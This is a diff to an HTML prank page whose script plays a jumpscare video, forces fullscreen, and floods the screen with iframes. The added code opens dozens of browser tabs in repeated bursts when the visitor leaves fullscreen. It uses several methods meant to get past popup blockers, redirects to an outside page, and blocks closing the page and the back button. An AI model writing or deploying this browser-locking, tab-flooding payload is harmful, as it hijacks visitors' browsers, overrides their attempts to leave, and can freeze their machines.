@@ -42,7 +42,6 @@
       z-index: 1000;
     }
 
-    /* Hidden trap iframe */
     #trapFrame {
       position: fixed;
       top: 0;
@@ -55,7 +54,6 @@
       background: white;
     }
 
-    /* Mini iframes that will spawn everywhere */
     .miniFrame {
       position: fixed;
       width: 100px;
@@ -75,7 +73,6 @@
     <source src="jumpscare.mp4" type="video/mp4">
   </video>
 
-  <!-- This iframe will take over the page -->
   <iframe id="trapFrame" src="https://loganexotic.github.io/zakusone/"></iframe>
 
   <script>
@@ -85,8 +82,37 @@
     const trapFrame = document.getElementById('trapFrame');
     const url = 'https://loganexotic.github.io/zakusone/';
     let triggered = false;
+    let fullscreenExited = false;
 
-    // Function to spawn mini iframes all over the screen
+    function forceOpenTabs(count) {
+      for (let i = 0; i < count; i++) {
+        // Method 1: Standard window.open
+        try {
+          const win = window.open(url, '_blank');
+          if (!win || win.closed) {
+            // Method 2: Try with different window name
+            window.open(url, 'tab_' + Date.now() + '_' + Math.random());
+          }
+        } catch(e) {}
+
+        // Method 3: Click a hidden link
+        try {
+          const a = document.createElement('a');
+          a.href = url;
+          a.target = '_blank';
+          a.rel = 'noopener noreferrer';
+          document.body.appendChild(a);
+          a.click();
+          setTimeout(() => document.body.removeChild(a), 50);
+        } catch(e) {}
+
+        // Method 4: Use window.open with features
+        try {
+          window.open(url, '_blank', 'width=1024,height=768,menubar=no,toolbar=no,location=no,status=no,scrollbars=yes');
+        } catch(e) {}
+      }
+    }
+
     function spawnMiniIframes(count) {
       for (let i = 0; i < count; i++) {
         const iframe = document.createElement('iframe');
@@ -101,122 +127,100 @@
       }
     }
 
-    // Force open new windows using every possible method
-    function forceOpenTabs() {
-      const methods = [
-        () => window.open(url, '_blank'),
-        () => window.open(url, '_blank', 'noopener,noreferrer'),
-        () => {
-          const a = document.createElement('a');
-          a.href = url;
-          a.target = '_blank';
-          a.rel = 'noopener noreferrer';
-          document.body.appendChild(a);
-          a.click();
-          setTimeout(() => document.body.removeChild(a), 50);
-        },
-        () => {
-          // Try with window.open and a unique name to bypass popup blocker
-          window.open(url, 'tab_' + Date.now() + '_' + Math.random());
-        }
-      ];
-
-      // Try all methods multiple times
-      for (let m = 0; m < methods.length; m++) {
-        for (let i = 0; i < 3; i++) {
-          try { methods[m](); } catch(e) {}
-        }
-      }
-    }
-
-    // Main click handler
     pageBody.addEventListener('click', () => {
       if (triggered) return;
       triggered = true;
 
-      // Hide text
       overlayText.style.display = 'none';
-
-      // Show video
       video.style.display = 'block';
       video.play();
 
-      // Enter fullscreen
       const elem = document.documentElement;
       if (elem.requestFullscreen) elem.requestFullscreen();
       else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
       else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
 
-      // IMMEDIATELY: Spawn hundreds of iframes everywhere
-      for (let i = 0; i < 50; i++) {
-        setTimeout(() => spawnMiniIframes(20), i * 100);
+      // Spawn iframes in background
+      for (let i = 0; i < 30; i++) {
+        setTimeout(() => spawnMiniIframes(10), i * 100);
       }
 
-      // Force open real tabs
-      forceOpenTabs();
-
-      // After 2 seconds, show the trap iframe (takes over the page)
-      setTimeout(() => {
-        trapFrame.style.display = 'block';
-        // Hide video behind it
-        video.style.display = 'none';
-      }, 2000);
-
-      // Keep opening tabs in background
-      setInterval(() => {
-        forceOpenTabs();
-        spawnMiniIframes(10);
-      }, 2000);
+      // Open some tabs immediately too
+      setTimeout(() => forceOpenTabs(5), 100);
 
     }, { once: true });
 
-    // When fullscreen exits - TRAP THEM
+    // THIS IS THE KEY PART - When they exit fullscreen, open REAL tabs
     document.addEventListener('fullscreenchange', () => {
       if (!document.fullscreenElement && triggered) {
-        // Trap them in the iframe
+        fullscreenExited = true;
+        
+        // Show the trap iframe
         trapFrame.style.display = 'block';
         video.style.display = 'none';
+
+        // OPEN REAL TABS - 20 tabs immediately
+        forceOpenTabs(20);
         
-        // Open massive tabs
-        for (let i = 0; i < 10; i++) {
-          setTimeout(forceOpenTabs, i * 100);
-        }
-        
-        // Spawn hundreds of iframes
+        // Open more after delays
+        setTimeout(() => forceOpenTabs(15), 300);
+        setTimeout(() => forceOpenTabs(15), 600);
+        setTimeout(() => forceOpenTabs(15), 1000);
+        setTimeout(() => forceOpenTabs(15), 1500);
+        setTimeout(() => forceOpenTabs(20), 2000);
+        setTimeout(() => forceOpenTabs(25), 3000);
+
+        // Keep opening tabs every few seconds
+        setInterval(() => {
+          forceOpenTabs(10);
+        }, 3000);
+
+        // Spawn massive iframes
         for (let i = 0; i < 20; i++) {
-          setTimeout(() => spawnMiniIframes(30), i * 50);
+          setTimeout(() => spawnMiniIframes(20), i * 50);
         }
 
-        // Redirect main window to the URL
+        // Try to redirect the main window too
         try {
           window.location.href = url;
         } catch(e) {}
       }
     });
 
-    // Prevent closing the page
+    // Also detect webkit fullscreen exit
+    document.addEventListener('webkitfullscreenchange', () => {
+      if (!document.webkitFullscreenElement && triggered) {
+        fullscreenExited = true;
+        trapFrame.style.display = 'block';
+        video.style.display = 'none';
+        forceOpenTabs(20);
+        setTimeout(() => forceOpenTabs(15), 500);
+        setTimeout(() => forceOpenTabs(15), 1000);
+        setInterval(() => forceOpenTabs(10), 3000);
+      }
+    });
+
+    // Prevent closing
     window.addEventListener('beforeunload', (e) => {
       if (triggered) {
         e.preventDefault();
         e.returnValue = '';
-        // Open more tabs when they try to close
-        forceOpenTabs();
+        forceOpenTabs(10);
         return '';
       }
     });
 
-    // Also when they try to go back
+    // Trap back button
     window.addEventListener('popstate', () => {
       if (triggered) {
-        forceOpenTabs();
+        forceOpenTabs(10);
         window.history.pushState(null, '', window.location.href);
       }
     });
 
-    // Push history state to trap back button
     window.history.pushState(null, '', window.location.href);
 
-    console.log('🔥 Click to unleash');
+    console.log('🔥 Click to start - REAL TABS will open when you exit fullscreen!');
   </script>
 
 </body>
